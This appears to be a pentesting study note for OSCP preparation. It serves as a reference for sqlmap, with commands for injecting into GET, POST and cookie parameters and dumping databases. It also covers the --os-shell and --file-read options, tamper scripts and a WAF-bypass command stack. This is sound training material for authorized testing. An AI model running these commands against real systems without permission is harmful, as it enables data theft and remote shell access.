# Sqlmap

#Sqlmap #SQLi #AutomatedSQLi #WAFBypass #OSShell #FileRead #DatabaseEnum

Automated SQL injection detection and exploitation framework. Handles MySQL, MSSQL, PostgreSQL, Oracle, SQLite. Covers the full injection lifecycle from detection through database dump, file read, and OS shell access.

Already on Kali by default (`sqlmap`). Docs: [sqlmap.org](https://sqlmap.org) / [GitHub wiki](https://github.com/sqlmapproject/sqlmap/wiki).

---

## Quick-start syntax

```bash
# GET parameter
sqlmap -u 'http://TARGET/page.php?id=1' --batch --dump

# POST body
sqlmap -u 'http://TARGET/page.php' --data 'id=1' --batch --dump

# Cookie injection (* = injection point)
sqlmap -u 'http://TARGET/page.php' -H 'Cookie: id=*' --batch --dump

# JSON body via saved request file
sqlmap -r request.req --batch --dump

# Target specific DB and table (important for time-blind — don't dump everything)
sqlmap -u 'http://TARGET/page.php?id=1' -D dbname -T tablename --batch --dump
```

---

## Injection types (fastest to slowest)

| Type | Flag letter | Notes |
|------|------------|-------|
| UNION query-based | U | Fastest — data returned inline |
| Error-based | E | Fast — data embedded in DB error message |
| Inline queries | Q | Subquery in SELECT list |
| Stacked queries | S | Semicolon-separated; enables xp_cmdshell etc |
| Boolean-based blind | B | Slow — yes/no per request |
| Time-based blind | T | Slowest — SLEEP() delays encode answers |

---

## Flag reference

| Flag | What it does |
|------|-------------|
| `--batch` | Non-interactive mode (auto-accept defaults) |
| `--dump` | Dump all data from target table(s) |
| `--dbs` | List all databases |
| `--tables` | List tables (add `-D db` to scope to one DB) |
| `--columns` | List columns (requires `-T table`) |
| `--schema` | Full schema of all databases |
| `-D db` | Target a specific database |
| `-T table` | Target a specific table |
| `--technique=XYZST` | Restrict to specific technique letters |
| `--level 1-5` | How many injection points to test (default 1) |
| `--risk 1-3` | How aggressive payloads get (default 1) |
| `--prefix='text'` | Prepend text before payload (close brackets) |
| `--union-cols=N` | Force exact column count for UNION |
| `--random-agent` | Rotate User-Agent per request |
| `--csrf-token=name` | Auto-refresh CSRF token before each request |
| `--randomize=param` | Generate a fresh random value for this param |
| `--tamper=script` | Post-process payload through a tamper script |
| `--search -C keyword` | Search column names containing keyword |
| `--file-read /path` | Read remote file (requires FILE privilege) |
| `--os-shell` | Interactive OS command shell via webshell |
| `--web-root /path` | Override web root for os-shell stager |
| `--ignore-code=N` | Keep scanning even if HTTP status is N |
| `-r file.req` | Load full HTTP request from a file |
| `-H 'header: value'` | Add/override an HTTP header |
| `-p param` | Test only this parameter |

---

## Output location

All dumps and file reads saved to:
```
~/.local/share/sqlmap/output/<target_host>/dump/<db>/<table>.csv
~/.local/share/sqlmap/output/<target_host>/files/_var_www_html_flag.txt
```
Remote paths become local filenames with `/` replaced by `_`.

---

## Useful tamper scripts

| Script | Transformation |
|--------|---------------|
| `between` | `>` → `BETWEEN x AND y+1` |
| `space2comment` | spaces → `/**/` |
| `randomcase` | `SELECT` → `sElEcT` |
| `charencode` | URL-encode non-standard chars |
| `apostrophemask` | `'` → unicode full-width `'` |

List all: `ls /usr/share/sqlmap/tamper/`

---

## Typical WAF bypass stack

```bash
sqlmap -r request.req --batch --dump \
       --level 5 --risk 3 \
       --random-agent \
       --tamper=between \
       --technique=T \
       -D production -T final_flag
```

---

## Full notes

→ [[10. SQL Injection Attacks|SQL Injection Attacks]] (HTB module, advanced flags)
→ [[10. SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2]] (Offsec module, basics)
→ [[SQL Injection & Databases#Sqlmap|Command Appendix sqlmap section]] (full syntax ref)
→ [[SQL Injection & Databases (Decision Tree)|SQLi Decision Tree]] (when to use which flag)
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

Sqlmap supports a repeatable task in an authorized assessment; knowing when to use it keeps the workflow deliberate rather than tool-led.

## Tool description

Sqlmap is a focused utility for the technique named by this page. Read its output as evidence and confirm important findings manually.

## Install

Use the package or project installation method available on Kali. For an apt package, the pattern is:

~~~bash
sudo apt install sqlmap
~~~

## Basic usage

Run the help screen first, then use the smallest command that answers the current question:

~~~bash
sqlmap --help
~~~

## Related RUNBOOK V2 stage

- [[RUNBOOK V2/Index]] -- route to the technique-specific stage after identifying the finding

## Related module

- [[MODULES/13. Locating Public Exploits]] -- understand the tool’s place in a controlled workflow
